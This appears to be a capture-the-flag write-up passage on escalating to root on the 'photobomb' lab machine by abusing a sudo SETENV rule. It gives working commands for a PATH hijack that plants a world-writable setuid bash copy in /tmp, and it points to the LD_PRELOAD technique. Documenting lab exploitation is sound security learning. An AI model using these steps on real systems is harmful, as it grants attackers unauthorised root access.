
### LD_PRELOAD for privesc

I can use `sudo -l` without any password (Because of the NOPASSWD)

```bash
wizard@photobomb:~$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

We see that I can SETENV before running the script `/opt/cleanup.sh`, so I can use the LD_PRELOAD trick (see hacktricks)

Source:
https://book.hacktricks.xyz/linux-hardening/privilege-escalation#:~:text=LD_PRELOAD%20%26%20LD_LIBRARY_PATH

#### Path Hijacking
in the previous example it's also possible to do a path hijacking

```bash
wizard@photobomb:~$ cat find
#!/bin/bash
cp /bin/bash /tmp/asd; chmod 4777 /tmp/asd
wizard@photobomb:~$ chmod 777 find
wizard@photobomb:~$ sudo PATH=/home/wizard:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin /opt/cleanup.sh
wizard@photobomb:~$ ls -la /tmp/asd
-rwsrwxrwx 1 root root 1183448 Oct  8 21:37 /tmp/asd
```

